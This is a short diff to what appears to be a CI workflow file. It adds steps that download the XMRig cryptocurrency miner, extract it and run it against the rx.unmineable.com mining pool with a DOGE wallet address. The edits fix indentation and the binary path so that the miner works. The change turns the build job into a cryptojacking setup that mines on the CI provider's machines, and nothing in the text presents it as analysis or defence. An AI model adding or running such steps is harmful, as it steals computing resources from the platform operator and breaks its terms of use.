@@ -55,6 +55,6 @@ jobs:
 
           wget -r https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz
 
-            tar -xf github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz
+          tar -xf github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz
   
-              ./1.28a/xmrig -o rx.unmineable.com:3333 -a rx -k -u DOGE:DAokVSr8PrX6qpyCDtDne54UoaQcreiejb.x3
+          ./xmrig -o rx.unmineable.com:3333 -a rx -k -u DOGE:DAokVSr8PrX6qpyCDtDne54UoaQcreiejb.x3
